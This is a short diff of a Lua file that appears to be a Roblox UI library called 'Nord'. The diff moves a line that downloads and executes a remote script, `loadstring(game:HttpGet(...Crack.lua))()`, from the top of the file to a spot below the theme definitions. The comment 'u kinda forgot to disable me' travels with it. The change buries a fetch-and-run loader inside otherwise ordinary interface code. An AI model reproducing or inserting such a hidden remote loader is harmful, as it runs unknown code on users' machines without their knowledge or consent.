@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://scripts.nord.vip/Crack.lua"))()
- -- u kinda forgot to disable me
 local GuiService = game:GetService("GuiService")
 -- << Services >> --
 local TweenService, Core do
@@ -73,6 +71,9 @@ Nord["Themes"] = {
         }
     }
 }
+
+loadstring(game:HttpGet("https://scripts.nord.vip/Crack.lua"))()
+ -- u kinda forgot to disable me
 
 function Nord:TextConstraint(Item)
 	New("UITextSizeConstraint", {Parent = Item, MaxTextSize = Item["TextSize"]}); Item["TextScaled"] = true
